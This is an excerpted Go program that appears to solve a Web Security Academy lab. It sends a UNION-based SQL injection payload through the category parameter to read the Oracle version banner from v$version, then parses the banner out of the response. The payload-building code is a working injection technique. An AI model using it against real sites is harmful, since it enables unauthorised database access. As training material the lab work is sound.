...
func solve() error {
	...
	u := "https://0aa50002040bbb2cc0ed56d500db0019.web-security-academy.net"
	filterUrl := u + "/filter"
...
func fetchVersion(u string, numCols, textCol int, client *http.Client) ([]string, error) {
	...
	nulls[textCol] = "'@@'||banner||'@@'"

	filterUrl := u + "?category=" + url.QueryEscape("Gifts' union select "+strings.Join(nulls, ",")+" from v$version--")
	fmt.Println(filterUrl)
	resp, err := client.Get(filterUrl)
	if err != nil {
		return nil, err
	...
	matchesGroups := versionRE.FindAllSubmatch(body, -1)
	if len(matchesGroups) == 0 {
		return nil, fmt.Errorf("version not found")
	}
	vers := make([]string, len(matchesGroups))
	for i, m := range matchesGroups {
		if len(m) != 2 {
			return nil, fmt.Errorf("version not found")
		}
		vers[i] = string(m[1])
